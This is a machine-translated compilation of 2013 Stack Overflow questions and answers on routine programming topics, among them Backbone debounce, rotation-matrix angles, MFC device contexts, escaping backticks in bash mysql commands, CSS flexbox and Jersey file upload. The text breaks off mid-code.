Underscore 的[debounce](http://underscorejs.org/#debounce)方法对于不需要数据绑定的所有复杂性的小规模 DOM 操作来说是一个很好的解决方案。等待大约 250 次的去抖动对我来说效果很好，确保渲染总是发生在数据更改上，但只有在我们连续获得大量更新时才会发生一次。

假设我们创建了一个扩展 Backbone.Firebase.Collection 的集合，那么我们可以执行以下操作：

```
var View = Backbone.View.extend({

   initialize: function() {
      this.listenTo( this.collection, 'add remove', _.debounce(_.bind(this.dataChanged, this), 250) );
   },

   render: function() {
       this._isRendered = true;

       /* do all my rendering magic here */
   },

   dataChanged: function() {
      // wait until render has been called at least once
      // if so, re-render on any change
      this._isRendered && this.render();
   }
}); 
```

**使用 Deferred 等待加载的数据**

在我的 Backfire 实现中，我添加了一个有状态的方法，它会在第一次加载时通知我。我使用 jQuery 的[Deferred](http://api.jquery.com/category/deferred-object/)对象做到了这一点。然后我只听集合触发一个`sync`事件：

```
this.collection.once('sync', /* data is loaded */); 
```

Firebase 的一个好处是最初的 Firebase.on('child_added'...) 结果（现有记录）往往会出现在一个很好的大块中——一个接一个。所以作为一个额外的好处，我使用 debounce 使我的“加载”方法在初始集群完成后触发，所以我没有得到一条记录，调用加载，然后立即需要对一系列更新采取一些行动。

由于这是特定于实现的，我将在这里有点抽象，但这是它的要点：

```
// inside my wrapper for Backbone.Firebase.Collection
this.ready = $.Deferred();

// debounce our ready listener so it fires on the tail end of 
// the initial update clump which reduces the number of update 
// calls on the initial load process considerably
this.readyFn = _.debounce(this.ready.resolve, 250);

// start monitoring for the first series of updates
// this would need to be invoked before the sync is established
this.on( 'add', this.readyFn );

// wait for the data to come in 
this.ready.always( _.bind(function() { 
   // when the ready promise is fulfilled, we can turn off the listener
   this.off('add', this.readyFn);

   // this is where we trigger the listener event used above
   this.trigger('sync');
}, this) ); 
```

我会小心使用这个解决方案。我发现在大多数情况下，我可以通过忘记初始加载并将所有内容初始化为空，然后将所有内容视为更新来大大简化事情。

我只在不存在数据时需要显示一些替代视图的情况下使用它（例如入门说明）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:30:57.123

这是我想出的一种方法——在集合中使用 firebase 对象：

```
todos.firebase.on('value', function(snapshot){
    // do stuff
}); 
```

这是最好的方法吗？

# c - 如何从矩阵中获取角度

> ID：15262897
> 
> 赞同：1
> 
> 时间：2013-03-07T04:08:43.063
> 
> 标签：c, opengl

我有一个这样的旋转矩阵：

```
1.0       0.0        0.0        2.07814
0.0      -0.809017   0.587785   0.0
0.0      -0.587785  -0.809017   0.0
0.0       0.0        0.0        1.0 
```

我怎样才能从中得到角度？如果我应用逆，我得到这个

```
cos exp -1 (-0.809017) = 144.0
sin exp -1 (-0.587785) = -36.0
sin exp -1 ( 0.587785) =  36.0
cos exp -1 (-0.809017) = 144.0 
```

但我的问题是我知道这个角度是 216.0 度，我该如何找回那个角度？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-07T05:38:09.457

要从 3x3 旋转矩阵 (R) 获得旋转角度 (theta)，您可以使用以下公式：

> tr(R) = 1 + 2 * cos(θ),

其中 tr 是[迹](http://en.wikipedia.org/wiki/Trace_%28linear_algebra%29)线。

在您的示例中，旋转由下式给出：

```
1.00000   0.00000   0.00000
0.00000  -0.80902   0.58779
0.00000  -0.58779  -0.80902 
```

因此跟踪是

```
1 - 0.80902 - 0.80902 = -0.61804` 
```

角度为 acos((-0.61804 - 1) / 2) * (180/pi) = 144°

因此，矩阵表示逆时针旋转 144°。或者，因为 144 = -216 mod 360，它表示顺时针旋转 216°。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-03-07T04:14:49.453

我认为您正在计算反函数~~错误地~~以一种让我感到奇怪的方式。您应该使用`asin`逆sin 和`acos`逆cos。您正在计算*乘法*逆，而不是*功能*逆。虽然在这里，它似乎是同一件事。

使用该`atan2()`功能。它将从 y 和 x 值产生角度。它隐含地计算逆 sin 和逆 cos，并检查 y 和 x 的符号以发现正确的象限。

```
ATAN2(3)

姓名
       1.8 `atan2', `atan2f'--y/x 的反正切

概要
            ＃包括
            双atan2（双Y，双X）；
            浮动 atan2f（浮动 Y，浮动 X）；

描述
       `atan2' 计算 Y/X 的反正切（反正切）。`atan2'
       即使对于 pi/2 或 -pi/2 附近的角度（即
       即，当 X 接近 0 时）。

          `atan2f' 与 `atan2' 相同，只是它接受并返回 `float'。

回报
       `atan2' 和 `atan2f' 返回一个弧度值，范围为 -pi 到 pi。

```

我假设我们忽略了 2.07814 这显然不是旋转的一部分。`atan2(0.587785, -0.809017)`给我144.0度。`atan(-0.587785, -0.809017)`给出 216.0。

* * *

啊哈！您的矩阵与我习惯的矩阵“横向”。我认为 2.07814 部分只是翻译。使用这个 3d 旋转矩阵作为指导，

```
1  0   0
0  cos sin
0 -sin cos 
```

......让我和以前一样困惑。我不断得到144.0。

* * *

*一个告白。*

我忽略了上面的弧度/度数问题，因为我使用 Postscript 而不是 C。

```
$ gsnd -q
GS>0.587785 -0.809017 atan =
144.0
GS>-0.587785 -0.809017 atan =
216.0
GS> 
```

# xamarin.android - Mono for Android 找不到资产文件

> ID：15262901
> 
> 赞同：0
> 
> 时间：2013-03-07T04:09:02.457
> 
> 标签：xamarin.android, assets

在多次尝试使其工作后，我感到很沮丧，我想在使用 MonoDevelop 和 mono for android 时从 assets 文件夹中读取一个文本文件。

我在这里按照教程：http: [//docs.xamarin.com/guides/android/advanced_topics/using_android_assets](http://docs.xamarin.com/guides/android/advanced_topics/using_android_assets)

但我明白了：

```
UNHANDLED EXCEPTION: Java.IO.FileNotFoundException: Exception of type'Java.IO.FileNotFoundException' was thrown.
at Android.Runtime.JNIEnv.CallObjectMethod (intptr,intptr,Android.Runtime.JValue[]) <0x00080>
at Android.Content.Res.AssetManager.Open (string) <0x0012b>
at Application.Android.AppActivity.OnCreate (Android.OS.Bundle) <0x0009b>
at Android.App.Activity.n_OnCreate_Landroid_os_Bundle_ (intptr,intptr,intptr) <0x0005f>
at (wrapper dynamic-method) object.ee3982cf-bdcd-4242-9d0f-0d1b3908a490 (intptr,intptr,intptr) <0x00043>

      --- End of managed exception stack trace ---
java.io.FileNotFoundException: read_assets.txt
at android.content.res.AssetManager.openAsset(Native Method)
at android.content.res.AssetManager.open(AssetManager.java:313)
at android.content.res.AssetManager.open(AssetManager.java:287)
at application.android.AppActivity.n_onCreate(Native Method)
at application.android.AppActivity.onCreate(AppActivity.java:36)
at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1047)
at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2627)
at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2679)
at android.app.ActivityThread.access$2300(ActivityThread.java:125)
at android.app.ActivityThread$H.handleMessage(ActivityThread.java:2033)
at android.os.Handler.dispatchMessage(Handler.java:99)
at android.os.Looper.loop(Looper.java:123)
at android.app.ActivityThread.main(ActivityThread.java:4627)
at java.lang.reflect.Method.invokeNative(Native Method)
at java.lang.reflect.Method.invoke(Method.java:521)
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
at dalvik.system.NativeStart.main(Native Method) 
```

我打开apk文件，里面没有assets文件夹，是我做错了吗？

顺便说一句，我正在使用模拟器

更新：
对不起，这是一个错字，我错过了我的文件名中的“s”，所以现在一切正常，我该如何删除这篇文章？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-10T10:29:05.707

It's just a typo mistake I've made, the file in Assets folder was named "read_asset.txt", but I wrote "read_assets.txt" in my code, sorry. But I still haven't figured it out why apk structure is different from java based packages.

# c++ - CClientDC 和 CWnd::GetDC 有什么区别

> ID：15262903
> 
> 赞同：3
> 
> 时间：2013-03-07T04:09:14.383
> 
> 标签：c++, mfc

我想知道 CClientDC 和 CWnd::GetDC 之间是否有任何区别。尽管存在资源分配和语义的事实，但似乎两者都相当平等。

一个例子：

```
CClientDC dc(this); // "this" is sub-classed object of CWnd
CGdiObject* oldObj = dc.SelectStockObject(WHITE_BRUSH);
... do some with dc ...
dc.SelectObject(oldObj);
// Device object is stack object, ReleaseDC called automaticly 
```

或者

```
CDC* dc = this->GetDC(); // "this" is sub-classed object of CWnd
CGdiObject* oldObj = dc->SelectStockObject(WHITE_BRUSH);
... do some with dc ...
dc->SelectObject(oldObj);
// Device context belongs to a window class no need to call ReleaseDC 
// I don't allocate dc, so I don't delete it 
```

除了语义不同之外，这两个代码片段看起来都是相同的，但是如果有的话，区别在哪里？我对它们的使用有什么关注。

GetDC() 只是 CClientDC(this) 的捷径吗？我有点困惑。

**编辑**： CClientDC() 返回的设备上下文与 GetDC() 返回的设备上下文不同 - 在某些情况下 - 我想知道为什么。

例子：

```
HRC hRC = wglCreateContext(GetDC()->m_hDC); // work's as expected. 
```

但

```
ClientDC dc(this)   
HRC hRC = wglCreateContext(dc.m_hDC); // does not work as expected, output in
                                      // clients device context not screen visible. 
```

因此，同一窗口上的两个客户端设备上下文之间肯定存在细微差别，但 MSDN 没有提供这方面的信息。[CClientDC](http://msdn.microsoft.com/en-US/library/dc7zsf0y%28v=VS.80%29.aspx)和[GetDC](http://msdn.microsoft.com/en-US/library/71eseab0%28v=VS.80%29.aspx)见 MSDN 上的功能描述。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T05:06:30.277

DC 有 3 种类型：普通 DC、类 DC 和私有 DC。如果 GetDC() 返回一个公共 DC，则必须对其调用 ReleaseDC()。如果 GetDC() 返回类 DC 或私有 DC，则调用 ReleaseDC() 将不会发生任何事情。

因此，您的第二段代码很可能存在资源泄漏。

本文详细介绍了3种DC：http: [//www.codeproject.com/Articles/2078/Guide-to-WIN32-Paint-for-Intermediates](http://www.codeproject.com/Articles/2078/Guide-to-WIN32-Paint-for-Intermediates)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-05T19:49:15.113

关于 CClientDC 需要意识到的一件重要事情是它是一个*类*- 所以当它脱离上下文时，你的 dc 也是如此。类构造函数调用GetDC，析构函数调用ReleaseDC。这意味着 dc 在下一个右括号中消失了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-08T07:00:21.703

ClientDC() 隐式管理 getDC() 和 releaseDC()。我们不需要照顾它。

在调用 GetDC() 时，如果我们使用的是非窗口设备上下文，那么我们需要显式调用releasec()。

# php - 数组减法和分配数组值

> ID：15262906
> 
> 赞同：0
> 
> 时间：2013-03-07T04:09:29.007
> 
> 标签：php, arrays

我有 2 个使用 2 个 while 循环来自数据库的数组。

```
while($row2 = mysql_fetch_assoc($result2))
    {
        $surveyscnt[$row2['user_grp_id']]=$row2['COUNT( * )'];
    }

    while($row3 = mysql_fetch_assoc($result3))
    {
        $ndhcnt[$row3['group_id']]=$row3['headcount'];
    } 
```

谁能指导我如何在 foreach 循环中执行以下操作

请参阅下面的 foreach 循环

```
 foreach($surveyscnt as $node => $headcount){
            if($ndhcnt[$node]!=$headcount){             
                $pIdsNself = getAllParentsNself(array(**NEED TO CALL group_id**));
                updateRollups($pIdsNself,**NEED TO PUT THE DIFFERENCE of(COUNT*-headcount)** );
            }
    } 
```

任何形式的帮助表示赞赏

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T05:00:30.067

试试这个，如果有问题请告诉我。

1.  在您的 sql 查询中放入`COUNT( * ) AS cnt`并在您获取它时输入：`$surveyscnt[$row2['user_grp_id']]=$row2['cnt'];`

2.  $pIdsNself =`getAllParentsNself(array(**NEED TO CALL group_id**));`这里 $node 是您的组 ID（根据您的编码），因此将行更改为`getAllParentsNself(array($node));`

3.  `updateRollups($pIdsNself,**NEED TO PUT THE DIFFERENCE of(COUNT*-headcount)** );`, 这里你有 count* 和 head count 所以这条线是`updateRollups($pIdsNself,($headcount-$ndhcnt[$node]) );`

# jquery - 悬停导致jquery子菜单快速闪烁/闪烁

> ID：15262908
> 
> 赞同：0
> 
> 时间：2013-03-07T04:09:38.290
> 
> 标签：jquery, flash, menu, flicker, submenu

我是 css、jquery 等方面的新手。我从 ThemeForest 购买了一个模板，直到一周前它都可以正常工作。现在，当我将鼠标悬停在子菜单上时，它们会快速闪烁或闪烁。我不知道发生了什么变化，而且我当然没有对 jquery 进行任何编辑，尤其是因为我什至无法弄清楚这段代码在哪里。我曾尝试对此进行研究，但是对于使用代码如此陌生，我什至不确定从哪里开始。我非常感谢您提供的任何反馈。

这是网站。

[http://www.allegrocreative.com/METSS/index.html](http://www.allegrocreative.com/METSS/index.html)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T04:19:26.000

看看`.stop()`事件队列@ [jquery-Api的-function](http://api.jquery.com/stop/)

如果有人在所有菜单上悬停很多，你应该使用带有“.stop（true，true）”的动画来不填充队列......

# javascript - 仅 Internet Explorer 中的 socketio 问题

> ID：15262909
> 
> 赞同：0
> 
> 时间：2013-03-07T04:09:38.960
> 
> 标签：javascript, socket.io

我有一个小聊天应用程序，我正在用 socketio 编写。我有在 Chrome 和 Firefox 中工作的部分，但 Internet Explorer 7-9 都有问题。

我在 socket.io.js 之前和之后都包含了 WebSocketMainInsecure.swf 和 WebSocketMain.swf（不是同时），但我得到了错误。

这是错误，[http://screencast.com/t/uUsnyGLV](http://screencast.com/t/uUsnyGLV) 我可以看出它与 flash/swf 对象有关。这就是我包含 swf 的方式，

```
<object width="0" height="0">
    <param value="resources/lib/socketio/WebSocketMainInsecure.swf">
    <embed src="resources/lib/socketio/WebSocketMainInsecure.swf">
    </embed>
</object>
<script type="text/javascript" src="resources/lib/socketio/socket.io.js"></script> 
```

任何想法我做错了什么？谢谢！

编辑 - 在查看 socket.io 的开发版本中的错误后，它看起来像一个带有 id 的元素 webSocketFlash 丢失了。我尝试添加具有该 ID 的 iframe，还尝试将 ID 添加到对象标记中。虽然仍然有同样的错误。

我在nodejs中也有这个配置。

```
io.set('transports', [
    'websocket'
    , 'flashsocket'
    , 'htmlfile'
    , 'xhr-polling'
    , 'jsonp-polling'
]); 
```

我还在端口 3000 上运行 nodejs，并在端口 80 上使用 apache 提供我的文件

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T06:01:21.410

I found the issue. I was using `location.origin` to create my socket like this,

```
var socket = io.connect(location.origin + ":3000"); 
```

but IE doesn't have location.origin. Now I'm using this,

```
var socket = io.connect(location.protocol + "//" + location.host + ":3000"); 
```

# mysql - Codeigniter Active Record 查询顺序

> ID：15262911
> 
> 赞同：0
> 
> 时间：2013-03-07T04:10:07.760
> 
> 标签：mysql, codeigniter

这个查询有什么区别：

```
$this->db->select('*');
$this->db->from('logs AS l');
$this->db->join('log_group_ref AS r', 'l.log_id = r.log_id');
$this->db->like('l.log_title', 'hello');
$this->db->or_like('l.log_content', 'hello');
$this->db->where('r.group_id', 1); 
```

和这个：

```
SELECT * FROM logs as l
join log_group_ref as r
on l.log_id = r.log_id
where l.log_title like "%hello%"
or l.log_content like "%hello%"
and r.group_id = 1 
```

当我运行 CI 活动记录方式时，我会得到与通用查询不同的结果。

当我故意将错误放在 CI 查询上时，例如从字段中删除一个字母以在控制台上查看错误，它会将 WHERE 子句移到 JOIN 子句之后。

我认为这会有所不同，因为我从两者那里得到了不同的结果。

知道如何解决这个问题吗？

或者我正在运行错误的查询？

更新：

根据要求，这是 CI 生成的查询：

```
Error Number: 1054

Unknown column 'r.group_i' in 'where clause'

SELECT `*` FROM (`logs` AS l)JOIN `log_group_ref` AS r ON 
`l`.`log_id` = `r`.`log_id`JOIN `users` AS u ON `u`.`user_id`=`l`.`log_author`WHERE 
`r`.`group_i` = '1' AND `l`.`log_title` LIKE '%at%'OR `l`.`log_content` LIKE '%at%'

Filename: C:\xampp\htdocs\done\system\database\DB_driver.php

Line Number: 330 
```

在这里，我有意删除了最后一个 WHERE 子句中 r.group_id 中的“d”。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-07T09:06:34.850

你有一个不同，因为如果你选择它会有所不同

```
( someting like '%a'% or someting like '%b' ) and someting = 1
someting like '%a'% or ( someting like '%b'  and someting = 1)
someting like '%a'% or  someting like '%b'  and someting = 1 
```

所以正如我在评论使用中所写的那样存在差异

```
$this->output->enable_profiler(TRUE); 
```

要查看 CI 做了什么，您将查看查询和页面末尾以及大量 oder 数据，但要在 CI 中使用 ()，您需要类似

```
$this->db->where('(someting like "%'.$a.'%" or someting like "%'.$b.'%" )',null,false) 
```

我希望它有帮助

# php - 如何在电子商务网站中集成 Paypal 支付

> ID：15262920
> 
> 赞同：3
> 
> 时间：2013-03-07T04:11:14.257
> 
> 标签：php, codeigniter, paypal

我做了一个书店网站。我的所有工作都完成了。现在我被困在“付款”部分。我必须像[这个网站一样实施 Paypal 付款。](http://www.mandalabookpoint.com/index.php)

我阅读了 Paypal 开发者页面。但确切地说，我找不到任何正确的文件来实施 Paypal 付款。

我做了我自己的购物车。如果用户点击结帐，那么他们应该被转发到 Paypal 进行付款。

请通过与上述链接类似的付款集成给我一些建议来帮助我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-07T04:21:29.837

您显示的网站正在使用 Express Checkout 方法。您可以在此处找到文档[https://www.x.com/developers/paypal/documentation-tools/express-checkout/integration-guide/ECGettingStarted](https://www.x.com/developers/paypal/documentation-tools/express-checkout/integration-guide/ECGettingStarted)

还有另一种方法“自适应支付”，但这个方法相当复杂。我建议改用 Express Checkout。

**更新**

您可以在向 PayPal 付款的标头请求中包含用户定义变量，然后可以在成功付款后通过 IPN 或即时付款通知接收所有交易详细信息。您需要的详细信息在此 IPN 中。要实施 IPN，请确保您已遵循以下要求。

1.  您的 IPN 处理程序 URL 应该是公开的并且没有身份验证。这是将调用 PayPal 以发送 IPN 详细信息的 URL。
2.  您的处理程序应该有 HTTP Post。您可以通过 Request.Forms 访问 IPN 消息

# mysql - 解决具有列名的mysql linux bash有“-”&从文件中查询mysql

> ID：15262931
> 
> 赞同：5
> 
> 时间：2013-03-07T04:11:41.160
> 
> 标签：mysql, linux, bash

我在 linux bash 上查询 mysql 有问题，我的查询有 2 个带有“-”的列：

```
mysql -u root -pPass mydb -e "select `work-time` from work where `work-time`> '2013-0-3-07 00:00:00'"; 
```

但结果：

```
bash: work-time: command not found 
```

我知道这个引用“`”的问题但是如何解决这个问题？

**我更新我的查询**

**在线解决查询**：

```
mysql -u root -pPass mydb -e "select \`work-time\` from work where \`work-time\`> '2013-0-3-07 00:00:00'" 
```

**其他问题**

如果我将查询保存在文件中，并像这样查询

```
 mysql -u root -pPass mydb < query.sql 
```

得到错误：

```
ERROR at line 1: Unknown command '\`'. 
```

**使用标准查询从文件中解决查询**

```
select `work-time` from work where `work-time`> '2013-0-3-07 00:00:00' 
```

将查询保存到文件，例如。query.sql，并像这样查询：

```
mysql -u root -pPass mydb < query.sql 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T04:14:42.053

**Mysql 和在 bash shell 中使用反引号**

像下面这样的查询将失败，因为反引号字符在 shell 中具有特殊含义：

```
mysql -u root -pPass mydb -e "select `work-time` from work" 
```

从 shell 执行 sql 时，必须对反引号字符进行转义或在单引号字符串中使用。单引号字符串的示例如下：

```
mysql -u root -pPass mydb -e 'select `work-time` from work' 
```

要使用双引号完成相同的查询，我们需要像这样转义反引号字符：

```
mysql -u root -pPass mydb -e "select \`work-time\` from work" 
```

我建议阅读bash shell 中[双引号和单引号之间的区别。](http://www.howtogeek.com/howto/29980/whats-the-difference-between-single-and-double-quotes-in-the-bash-shell/)

* * *

**示例问题 1：**

```
"select `work-time` from work where `work-time`> '2013-0-3-07 00:00:00'" 
```

上述查询将不起作用。但是，您可以使用单引号来完成此操作，但您需要转义查询中的任何单引号，如下所示：

```
'select `work-time` from work where `work-time`> \'2013-0-3-07 00:00:00\'' 
```

* * *

**示例问题 2：**

```
"select \`work-time\` from work where \`work-time\`> \'2013-0-3-07 00:00:00\'" 
```

上面的查询几乎很好，因为您确实需要转义反引号，因为它具有特殊含义。但是，您不需要转义单引号。使用双引号，查询可能如下所示：

```
"select \`work-time\` from work where \`work-time\`> '2013-0-3-07 00:00:00'" 
```

* * *

**SQL 文件中的反引号**

如果您随后决定将此查询放在一个文件中并将其发送到 mysql，您将不再需要转义反引号字符，因为反引号字符在 sql 文件中没有特殊含义。在文件中，您只需放置标准 SQL：

```
select `work-time` from work where `work-time` > '2013-0-3-07 00:00:00' 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:14:48.477

反引号内的文本在使用裸引号或双引号时被解释为命令。

您需要使用单引号：

```
mysql -u root -pPass mydb -e 'select `work-time` from work' 
```

或者，您可以避开反引号：

```
mysql -u root -pPass mydb -e "select \`work-time\` from work" 
```

# rdf - SPARQL 端点如何在混搭场景中工作？

> ID：15262935
> 
> 赞同：0
> 
> 时间：2013-03-07T04:11:48.280
> 
> 标签：rdf, semantics, sparql

SAPRQL 端点如何工作，尤其是当我们有混搭场景时？

例如，我正在混合两个图表。一个是 DBpedia，另一个是 LMDB。

在执行 SPARQL 查询之前，它会从两个来源加载所有数据集吗？我猜不是。
如果没有，它会先在 DBpedia 或 LMDB 中寻找匹配的记录吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T12:32:42.440

如果您正在谈论在 SPARQL 中使用 service 关键字，那么不，查询将被独立回答，然后您执行的任何本地操作（不在 SERVICE 块中的内容）将由正在执行的端点执行。

# jquery - 动态创建的 Div 返回零高度

> ID：15262937
> 
> 赞同：0
> 
> 时间：2013-03-07T04:11:54.287
> 
> 标签：jquery

```
//Test function
function createDiv()
{
    textContainer = $(document.createElement("div"));
    $(textContainer[0]).html(msg);
    var ctrlHeight = $(textContainer).height();
    textContainer.show();
} 
```

如果我检查 div 的高度，它会返回 0，但如果我在调用后检查它`show`，它会返回高度。为什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-07T04:13:33.280

浏览器不会计算元素的大小，直到它在文档中并且可见

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-07T04:22:26.103

如果在浏览器中不可见，则不会计算高度。

# java - 从多线程客户端调用独立 Java 程序

> ID：15262952
> 
> 赞同：1
> 
> 时间：2013-03-07T04:14:08.210
> 
> 标签：java, parallel-processing

我有一个 3rd 方独立 Java 程序。我想从 Java 客户端运行它，该客户端将通过多个线程调用该程序以实现并行执行。挑战在于，这个第 3 方程序从环境变量中读取配置参数。我不希望并行线程覆盖彼此的配置。另外，由于我的客户端和这个 3rd 方程序都是用 Java 编写的，如果我可以避免创建多个 JVM 进程，那将是一个很大的增值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:18:54.050

您可以使用[`ProcessBuilder`](http://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html), 并填充该[`environment()`](http://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html#environment%28%29)方法返回的地图。

```
ProcessBuilder builder = new ProcessBuilder("java -cp . Foo");
Map<String, String> environment = builder.environment();
environment.put("Foo", "Bar");
environment.put("X", "Y");
Process process = builder.start(); 
```

由于每个进程都有自己的环境，这应该是安全的。

或者，您可以使用[`Runtime.exec`](http://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html#exec%28java.lang.String%5B%5D,%20java.lang.String%5B%5D%29).

# haskell - 在 98 Hugs 中加载文件

> ID：15262955
> 
> 赞同：0
> 
> 时间：2013-03-07T04:14:20.863
> 
> 标签：haskell

我正在使用 Hugs 98，我正在尝试加载这样的文件

：加载插入.hs

并一直说

*   无法打开文件“insert.hs”

我是 Haskell 的新手

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-07T08:04:19.833

尝试在 Hugs 提示符下输入`:! dir`（如果您在 Windows 上）或`:! pwd; ls`（在 Linux 上）：这将向您显示当前目录及其内容 - 它应该包含“insert.hs”。

如果不是这种情况，请这样做`:cd <location of insert.hs>`，然后您应该可以这样做`:load insert.hs`。

但就像 dsign 在评论中所说，考虑升级到 GHC - Hugs 已经过时 6 年多了！

# macos - 使用 Bash/Terminal 杀死应用程序窗口

> ID：15262956
> 
> 赞同：1
> 
> 时间：2013-03-07T04:14:24.833
> 
> 标签：macos, bash, unix, terminal

我正在尝试使用终端关闭预览中打开的窗口。我在互联网上找到的所有内容都建议使用 AppleScript，但我不能这样做，因为我不存在 plist 选项（启用 osascript 进行预览，如[Super User](https://superuser.com/questions/526624/how-do-i-close-a-window-from-an-application-passing-the-file-name)所示）。我正在运行 OS X 10.8.2。

我应该在这里指出，我并不真正关心 AppleScript，并且更喜欢 bash 解决方案。

重申一下，我在预览中打开了一个 .pdf，我想关闭访问和显示文件的特定窗口，而不是终止整个程序。我认为这是可能的，因为操作系统有一种方法可以在没有 bash 的情况下杀死窗口。

我还想知道操作系统在关闭应用程序的子进程（窗口）时如何与 shell 交互。

我可以找到打开的 .pdf、进程、套接字、节点等。使用 lsof，但自从 AFAIK 以来，我对进一步了解此类信息犹豫不决，我可以使用该信息终止整个进程（过度杀伤）或关闭端口/套接字（奇怪的终止）。

感谢您帮助我解决这个问题。我的谷歌能力让我失望，这真的让我很困扰。

编辑：在超级用户链接中添加了 osascript 启用添加上下文。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-07T04:26:21.927

您采用的方法是行不通的——应用程序中的窗口不是分开的，以至于您可以远程强制一个窗口关闭而不影响整个应用程序。

我能想到的唯一解决方案确实涉及 AppleScript。我不确定“plist 选项对我来说不存在”是什么意思。

```
tell application "System Events"
    click first button of (first window of process "Preview" whose name is "example.png")
end tell 
```

这比平常更令人费解，因为 Preview.app 是沙盒化的，因此无法通过普通方法编写脚本——我不得不改用 UI 脚本。（我单击的“第一个按钮”是窗口上的关闭按钮。）

# css - CSS 占用剩余空间

> ID：15262957
> 
> 赞同：0
> 
> 时间：2013-03-07T04:14:28.177
> 
> 标签：css, scroll, position, alignment

我知道有很多这样的问题。但我仍然找不到解决方案。

检查小提琴：http: [//jsfiddle.net/paulocoelho/Yy9Ep/2/](http://jsfiddle.net/paulocoelho/Yy9Ep/2/)

所有元素几乎占据了浏览器高度的 100%（连同顶部和底部边距）。在里面我有两个元素：

*   一个标题。高度可以变化（不可滚动）
*   一个灵活的区域。高度取决于父级的大小，占用剩余空间（可滚动）

如果我手动设置内容区域的高度，它会起作用，但这会破坏灵活性。

这是CSS，其余的检查小提琴：

```
.container{
    position:absolute;
    top:50px;
    bottom:10px;
    width:200px;
    background:green;
}

.flexible{
    /*This works but I need the height to be flexible depending on screen size and the natural height of the header */
    /*height:200px;*/
    overflow-y:scroll;
} 
```

编辑：

我宁愿不让这个由 JS 控制。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-07T04:18:45.643

灵活高度的最佳选择是 CSS Flexbox。

[http://caniuse.com/#search=flexbox](http://caniuse.com/#search=flexbox)

设置你的主要容器元素：

```
display: -webkit-box;
display: -moz-box;
display: box; 
```

但是，并非所有浏览器都很好地支持它。你知道，常见的嫌疑人...

这是一个优秀的 Mozilla 文章的链接，它解释了如何使用 Flexbox。

[https://hacks.mozilla.org/2010/04/the-css-3-flexible-box-model/](https://hacks.mozilla.org/2010/04/the-css-3-flexible-box-model/)

你会特别感兴趣`box-orient: vertical`并设置需要弯曲的子元素`box-flex: 1`

尝试使用 flexbox，它也会显示 CSS：

[http://flexiejs.com/playground/](http://flexiejs.com/playground/)

这是您使用 Flexbox 编辑的 jsfiddle：http: [//jsfiddle.net/Yy9Ep/3/](http://jsfiddle.net/Yy9Ep/3/)

有关 Flexbox 模块状态的其他信息：

[http://css-tricks.com/old-flexbox-and-new-flexbox/](http://css-tricks.com/old-flexbox-and-new-flexbox/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T04:23:25.763

我认为添加

```
height:70%; 
```

会做的伎俩，你可能不得不玩弄你想要设置的确切数量，但猜测它应该可以工作。

你可以在这里查看

[小提琴](http://jsfiddle.net/TDsouza/jF7Yd/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-07T04:26:55.610

CSS3 标准没有提供一种可靠的方法来填充父元素的高度。使用 height:100% 通常作为一种解决方案提供，但同样，各种浏览器并不一致支持。无论如何，现在通常认为这样做已经过时了。

如果您只是想将块元素锚定到页面或容器的底部并让中心区域滚动：

```
<div style"position:fixed; bottom:0;"> 
```

# java - 从客户端将文件作为参数发送到 REST 服务？

> ID：15262965
> 
> 赞同：5
> 
> 时间：2013-03-07T04:15:16.247
> 
> 标签：java, rest, jersey

我的要求是通过一个客户端将文件发送到 REST 服务。该服务将处理该文件。我正在使用 Jersey API 来实现这一点。但是我在很多文章中搜索过，没有任何关于**如何从客户端传递文件**以及**REST服务如何检索文件的**信息......如何实现这一点？

而且我没有使用 Servlet 来创建 REST 服务。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-07T04:28:55.287

假设您在客户端和服务器端都使用 Jersey，下面是一些您可以扩展的代码：

服务器端：

```
@POST
@Path("/")
@Produces(MediaType.TEXT_PLAIN)
@Consumes(MediaType.MULTIPART_FORM_DATA)
public Response uploadFile(final MimeMultipart file) {
    if (file == null)
        return Response.status(Status.BAD_REQUEST)
                .entity("Must supply a valid file").build();

    try {
        for (int i = 0; i < file.getCount(); i++) {
            System.out.println("Body Part: " + file.getBodyPart(i));
        }
        return Response.ok("Done").build();
    } catch (final Exception e) {
        return Response.status(Status.INTERNAL_SERVER_ERROR).entity(e)
                .build();
    }
} 
```

上面的代码实现了一个资源方法，它接受 POST 的多部分（文件）数据。它还说明了如何遍历传入（多部分）请求中的所有单个正文部分。

客户：

```
final ClientConfig config = new DefaultClientConfig();
final Client client = Client.create(config);

final WebResource resource = client.resource(ENDPOINT_URL);

final MimeMultipart request = new MimeMultipart();
